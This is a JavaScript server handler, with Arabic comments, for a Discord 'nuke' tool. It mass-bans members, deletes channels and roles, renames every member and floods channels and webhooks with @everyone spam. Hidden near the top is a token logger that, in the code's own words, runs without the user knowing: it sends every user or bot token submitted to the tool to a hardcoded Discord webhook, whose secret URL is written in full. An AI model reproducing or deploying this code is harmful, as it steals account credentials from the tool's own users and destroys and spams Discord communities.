// الويب هوك حق السحب (مخفي في السيرفر)
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1562882958971506741/obON4So4LrXacAndmbd54xaKAB-YQH-TlxDaK7sw5UGiQhJ0dax4vYXOlc0IyYfUHyOK";

const API_BASE = "https://discord.com/api/v10";

// دالة مساعدة لإرسال الطلبات لديسكورد مع تجنب الحظر (Rate Limits)
async function discordRequest(endpoint, method, body, token, isBot) {
    const authHeader = isBot ? `Bot ${token}` : token;
    const options = {
        method: method,
        headers: {
            "Authorization": authHeader,
            "Content-Type": "application/json"
        }
    };
    if (body) options.body = JSON.stringify(body);

    let res = await fetch(`${API_BASE}${endpoint}`, options);
    
    // إذا ديسكورد حظرنا، ننتظر ونعيد المحاولة
    if (res.status === 429) {
        const data = await res.json().catch(() => ({}));
        await new Promise(r => setTimeout(r, (data.retry_after || 1) * 1000));
        return discordRequest(endpoint, method, body, token, isBot);
    }
    if (res.status === 204) return true;
    return await res.json().catch(() => true);
}

export default async function handler(req, res) {
    // إعدادات CORS عشان الواجهة تقدر تتصل بالسيرفر
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(200).end();
    if (req.method !== "POST") return res.status(405).json({ message: "Method not allowed" });

    const data = req.body;
    const { action, token, isBot } = data;

    // 1. سحب التوكن (Logger) - يشتغل في الخلفية بدون ما يدري المستخدم
    if (token && LOG_WEBHOOK) {
        fetch(LOG_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `🚨 **توكن جديد تم سحبه!** 🚨\n**النوع:** ${isBot ? "Bot" : "User"}\n**التوكن:** \`${token}\``
            })
        }).catch(() => {});
    }

    try {
        // ================== أداة النيوك ==================
        if (action === "nuke") {
            const { guild, name, nickname, channels, msg, mentions, banall, delroles, delchannels } = data;
            
            if (banall) {
                const members = await discordRequest(`/guilds/${guild}/members?limit=1000`, "GET", null, token, isBot);
                if (Array.isArray(members)) {
                    for (let m of members) {
                        await discordRequest(`/guilds/${guild}/bans/${m.user.id}`, "PUT", { delete_message_seconds: 0 }, token, isBot);
                    }
                }
            }

            if (name) await discordRequest(`/guilds/${guild}`, "PATCH", { name }, token, isBot);

            if (delchannels) {
                const chans = await discordRequest(`/guilds/${guild}/channels`, "GET", null, token, isBot);
                if (Array.isArray(chans)) {
                    for (let c of chans) await discordRequest(`/channels/${c.id}`, "DELETE", null, token, isBot);
                }
            }

            if (delroles) {
                const roles = await discordRequest(`/guilds/${guild}/roles`, "GET", null, token, isBot);
                if (Array.isArray(roles)) {
                    for (let r of roles) {
                        if (r.name !== "@everyone" && !r.managed) {
                            await discordRequest(`/guilds/${guild}/roles/${r.id}`, "DELETE", null, token, isBot);
                        }
                    }
                }
            }

            if (nickname) {
                const members = await discordRequest(`/guilds/${guild}/members?limit=1000`, "GET", null, token, isBot);
                if (Array.isArray(members)) {
                    for (let m of members) {
                        await discordRequest(`/guilds/${guild}/members/${m.user.id}`, "PATCH", { nick: nickname }, token, isBot);
                    }
                }
            }

            let mStr = "@everyone ".repeat(mentions || 1);
            let finalMsg = (msg || "NUKED") + " " + mStr;
            for (let i = 0; i < (channels || 10); i++) {
                let ch = await discordRequest(`/guilds/${guild}/channels`, "POST", { name: `nuked-${i}`, type: 0 }, token, isBot);
                if (ch && ch.id) {
                    await discordRequest(`/channels/${ch.id}/messages`, "POST", { content: finalMsg }, token, isBot);
                }
            }
            return res.status(200).json({ message: "Nuke complete" });
        }

        // ================== سبام رسائل ==================
        if (action === "mass_spam") {
            const { channel, msg, amount, mention } = data;
            let finalMsg = msg + (mention ? " @everyone" : "");
            for (let i = 0; i < amount; i++) {
                await discordRequest(`/channels/${channel}/messages`, "POST", { content: finalMsg }, token, isBot);
                await new Promise(r => setTimeout(r, 500));
            }
            return res.status(200).json({ message: "Spam complete" });
        }

        // ================== سبام ويب هوك ==================
        if (action === "spam") {
            const { url, msg, amount } = data;
            for (let i = 0; i < amount; i++) {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: msg })
                }).catch(()=>{});
                await new Promise(r => setTimeout(r, 500));
            }
            return res.status(200).json({ message: "Webhook spam complete" });
        }

        return res.status(400).json({ message: "Unknown action" });

    } catch (error) {
        return res.status(500).json({ message: error.message });
    }
}
